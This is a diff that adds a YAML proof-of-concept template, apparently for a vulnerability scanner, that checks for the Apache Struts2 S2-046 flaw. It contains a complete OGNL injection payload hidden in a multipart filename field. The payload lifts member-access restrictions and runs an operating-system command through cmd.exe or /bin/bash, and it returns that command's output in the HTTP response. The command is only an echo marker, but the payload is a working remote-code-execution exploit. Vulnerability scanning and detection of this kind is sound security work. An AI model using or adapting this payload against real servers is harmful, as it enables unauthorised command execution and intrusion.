@@ -1,0 +1,16 @@
+name: poc-yaml-struts2_046-2
+set:
+  r1: b"-----------------------------\r\nContent-Disposition:\x20form-data;\x20name=\"test\";\x20filename=\"%{(#_=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo\x20struts2_security_check').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x00b\"\r\nContent-Type:\x20text/plain\r\n\r\n\r\n-----------------------------"
+rules:
+  - method: POST
+    path: /
+    headers:
+      Content-Type: multipart/form-data; boundary=---------------------------
+    follow_redirects: true
+    body: |
+      {{r1}}
+    expression: |
+      response.body.bcontains(b"struts2_security_check")
+detail:
+  author: shadown1ng(https://github.com/shadown1ng)
+
